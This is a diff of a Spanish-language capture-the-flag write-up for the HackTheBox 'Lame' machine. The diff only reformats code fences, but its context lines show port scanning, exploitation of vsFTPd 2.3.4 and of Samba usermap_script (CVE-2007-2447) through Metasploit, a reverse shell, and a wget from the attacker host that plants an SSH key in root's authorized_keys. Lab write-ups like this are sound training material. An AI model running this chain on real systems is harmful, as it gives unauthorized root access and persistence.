@@ -25,7 +25,7 @@ Su tarjeta de presentación es:
 
 Iniciamos por ejecutar un `nmap` y un `masscan` para identificar puertos udp y tcp abiertos:
 
-```text
+``` text
 root@laptop:~# nmap -sS -n --open -v -p- 10.10.10.3
 Starting Nmap 7.80 ( https://nmap.org ) at 2019-11-05 08:05 CST
 Initiating Ping Scan at 08:05
@@ -63,7 +63,7 @@ Nmap done: 1 IP address (1 host up) scanned in 233.25 seconds
 
 Como en otras ocasiones, verificamos los puertos abiertos con `masscan`:
 
-```text
+``` text
 root@laptop:~# masscan -e tun0 -p0-65535,U:0-65535 --rate 500 10.10.10.3
 
 Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2019-10-06 00:30:56 GMT
@@ -86,7 +86,7 @@ Como podemos ver los puertos son los mismos, por lo que iniciamos por identifica
 
 Lanzamos `nmap` con los parámetros habituales para la identificación (\-sC \-sV):
 
-```text
+``` text
 root@laptop:~# nmap -sV -sC -p139,445,3632,21 -v -n 10.10.10.3
 Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-05 19:36 CDT
 NSE: Loaded 151 scripts for scanning.
@@ -171,7 +171,7 @@ Con esta información concluimos que tenemos varios servicios abiertos, que tene
 
 Como en otras maquinas, en lugar de entrar y verificar carpeta por carpeta, creare un espejo de lo entregado por el servicio:
 
-```
+``` text
 xbytemx@laptop:~/htb/lame$ wget --mirror ftp://10.10.10.3
 --2019-10-05 19:39:09--  ftp://10.10.10.3/
            => “10.10.10.3/.listing”
@@ -200,7 +200,7 @@ Descargados: 1 ficheros, 119 en 0.001s (180 KB/s)
 
 Al no encontrar nada relevante, me conecte usando un cliente de FTP y verifique:
 
-```
+``` text
 xbytemx@laptop:~/htb/lame$ ftp 10.10.10.3
 Connected to 10.10.10.3.
 220 (vsFTPd 2.3.4)
@@ -229,7 +229,7 @@ No pudimos obtener mas información dentro del servicio, pero nos quedamos con l
 
 Ahora, exploremos el servicio de SMB utilizando `smbclient` de impacket:
 
-```
+``` text
 (impacket-a2aNp99x) xbytemx@laptop:~/git/impacket/examples$ python smbclient.py 10.10.10.3
 Impacket v0.9.18-dev - Copyright 2002-2018 Core Security Technologies
 
@@ -265,7 +265,7 @@ Pudimos enumerar los recursos compartidos, pero no encontramos nada relevante qu
 
 Utilizando `searchsploit`, encontraremos que la versión 2.3.4 de vsFTPd tiene una vulnerabilidad conocida, un backdoor de smile face:
 
-```
+``` text
 xbytemx@laptop:~/git/exploit-database$ ./searchsploit ftp 2.3.4
 -------------------------------------------------------------------------------------------------------------------------------------- -------------------------------------------------------
  Exploit Title                                                                                                                        |  Path
@@ -280,7 +280,7 @@ Como podemos ver, la vulnerabilidad es tan popular que tiene su propio exploit e
 
 Utilizando `metasploit-framework`, tratemos de explotar la vulnerabilidad:
 
-```
+``` text
 msf5 > search vsftpd
 
 Matching Modules
@@ -327,7 +327,7 @@ En la etapa anterior no pudimos identificar la versión exacta de SMB corriendo,
 
 > Nota, esto varia mucho entre versiones de SMB, por lo que es importante seguir enumerando con diferentes herramientas o enumerar con la herramienta correcta, la version correcta.
 
-```
+``` text
 (impacket-a2aNp99x) xbytemx@laptop:~/git/impacket/examples$ smbclient -L 10.10.10.3
 Unable to initialize messaging context
 Enter WORKGROUP\xbytemx's password:
@@ -357,7 +357,7 @@ Ok, `smbclient` nos devuelve que la versión de SMB es la 3.0.20~Debian. Realice
 
 Utilizando `searchsploit`, identificamos la siguiente vulnerabilidad:
 
-```
+``` text
 xbytemx@laptop:~/git/exploit-database$ ./searchsploit Samba 3.0.20
 -------------------------------------------------------------------------------------------------------------------------------------- -------------------------------------------------------
  Exploit Title                                                                                                                        |  Path
@@ -379,7 +379,7 @@ Después de revisar este [exploit](https://github.com/amriunix/CVE-2007-2447), o
 
 Básicamente cuando le pasamos el usuario durante la conexión, el nombre del usuario es usado para ejecutar comandos sobre sh, por lo que si mandamos expresiones de sustitución o evaluación script de sh, podemos ejecutar remotamente código que nos permita llamar a una conexión en reversa. Esto es lo que hace MSF tras bambalinas:
 
-```
+``` text
 msf5 > use exploit/multi/samba/usermap_script
 msf5 exploit(multi/samba/usermap_script) > show options
 
@@ -428,7 +428,7 @@ Aplicando la vieja confiable, agregamos nuestro certificado público en las llav
 
 Comenzamos por iniciar un web server para compartir la llave:
 
-```
+``` text
 xbytemx@laptop:~/.ssh$ python3 -m http.server 4001
 Serving HTTP on 0.0.0.0 port 4001 (http://0.0.0.0:4001/) ...
 10.10.10.3 - - [05/Nov/2019 08:24:47] "GET /id_rsa.pub HTTP/1.0" 200 -
@@ -438,7 +438,7 @@ Keyboard interrupt received, exiting.
 
 Mientras tanto, en el reverse shell:
 
-```
+``` text
 wget http://10.10.14.2:4001/id_rsa.pub -O /root/.ssh/authorized_keys
 --09:24:58--  http://10.10.14.2:4001/id_rsa.pub
            => `/root/.ssh/authorized_keys'
@@ -453,7 +453,7 @@ Length: 568 [application/octet-stream]
 
 Perfecto, ya agregamos nuestra llave, ahora solo falta validar:
 
-```
+``` text
 xbytemx@laptop:~/.ssh$ ssh -i id_rsa root@10.10.10.3
 Last login: Tue Nov  5 09:06:12 2019 from :0.0
 Linux lame 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686
@@ -477,7 +477,7 @@ Boom, tenemos shell como root.
 
 Ya desde esta shell, podemos tomar nuestras flags.
 
-```
+``` text
 root@lame:~# cat /home/makis/user.txt
 ```
 
@@ -485,7 +485,7 @@ root@lame:~# cat /home/makis/user.txt
 
 Tomamos la flag de root:
 
-```
+``` text
 root@lame:~# cat /root/root.txt
 ```
 
